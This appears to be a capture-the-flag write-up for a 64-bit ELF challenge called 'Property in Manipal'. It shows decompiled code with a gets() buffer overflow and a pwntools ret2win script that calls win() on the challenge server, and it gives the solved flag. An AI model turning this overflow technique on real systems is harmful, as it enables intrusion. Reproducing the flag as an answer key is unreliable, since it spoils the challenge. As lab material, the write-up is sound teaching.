# Property in Manipal  

Was provided with a binary called `manipal`. 

`file` output: 

```
manipal: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c59d3922c57c2579bfa468ff6b8745bb99f107f5, for GNU/Linux 4.4.0, not stripped
```

`checksec` output: 

```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   35 Symbols	  No	0		3		manipal
```

Considering `NX` is enabled, we won't be able to execute off of the stack 

Lets decompile the binary to see the code. 

```c
int win()
{
  return system("cat flag.txt");
}
__int64 vuln()
{
  char buf[64]; // [rsp+0h] [rbp-40h] BYREF

  printf("Enter your name to signup for the property: ");
  fflush(stdout);
  read(0, buf, 0x40u);
  printf("Hello, ");
  printf(buf);
  putchar(10);
  printf("Enter the amount for customizations: ");
  fflush(stdout);
  return gets(buf);
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  setvbuf(stdin, 0, 2, 0);
  puts("I bought a property in Mandavi");
  puts("& what they do for you is,");
  puts("they give you the property.");
  vuln();
  return 0;
}
```

As we can see, in the `vuln` function, `gets` is used which is clearly vulnerable to buffer overflow attacks. 

Considering `NX` bit is enabled, we need to create a `ROP` Chain in order to execute the `win` function. 


`script.py:`

```python
from pwn import * 

elf = ELF('./manipal')

win = p64(elf.symbols['win']) 
main = p64(elf.symbols['main']) 
vuln = p64(elf.symbols['vuln']) 

ret_addr = p64(0x000000000040117f)

p = remote('propertyinmanipal.nitephase.live', 42586)
payload = b"A"*72
payload += ret_addr 
payload += win

print(payload)
print(ret_addr)

p.sendlineafter(b'Enter your name to signup for the property:', b'something')

p.sendlineafter(b'Enter the amount for customizations', payload)

p.interactive()
```

flag: `nite{ch0pp3d_ch1n_r34lly_m4d3_2025_p34k_f0r_u5}`


References: 
- https://www.youtube.com/watch?v=8zRoMAkGYQE
- https://en.wikipedia.org/wiki/X86_calling_conventions#List_of_x86_calling_conventions